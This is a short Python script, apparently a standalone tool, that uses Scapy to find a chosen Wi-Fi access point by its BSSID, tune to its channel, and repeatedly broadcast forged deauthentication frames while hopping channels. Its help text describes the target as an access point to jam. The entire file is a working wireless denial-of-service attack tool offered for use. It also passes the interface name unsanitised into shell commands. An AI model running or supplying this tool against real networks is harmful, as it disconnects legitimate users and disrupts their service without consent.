#!/usr/bin/env python
# -*- coding: utf-8 -*-

import argparse, os, sys, signal
from scapy.all import *
from multiprocessing import Process

interface = ''
packets = 6
target = 'ff:ff:ff:ff:ff:ff'

def deauth(p):
    if (p.haslayer(Dot11Beacon) or p.haslayer(Dot11ProbeResp)) and target == p[Dot11].addr3:
        essid = p[Dot11Elt].info
        bssid = p[Dot11].addr3 
        channel = int(ord(p[Dot11Elt:3].info))
        client  = 'ff:ff:ff:ff:ff:ff'
        
        os.system("iw dev %s set channel %d" % (interface, channel))

        sendp(RadioTap()/Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=p.addr3)/Dot11Deauth(), count=packets, iface=interface, verbose=0)

def channel_hopper():
    while True:
        channel = random.randrange(1,12)
        os.system("iw dev %s set channel %d" % (interface, channel))
        time.sleep(0.5)

def signal_handler(signal, frame):
    p.terminate()
    p.join()

    sys.exit(0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='airodump scapy')
    parser.add_argument('-i', '--interface', dest='interface', type=str, required=True, help='interface to use')
    parser.add_argument('-p', '--packets', dest='packets', type=int, required=True, help='Count of packets')
    parser.add_argument('-t', '--target', dest='target', type=str, required=True, help='Bssid of access point to jammming')

    args = parser.parse_args()

    interface = args.interface
    packets = args.packets
    target = args.target

    p = Process(target = channel_hopper)
    p.start()

    signal.signal(signal.SIGINT, signal_handler)

    sniff(iface=interface, prn=deauth)
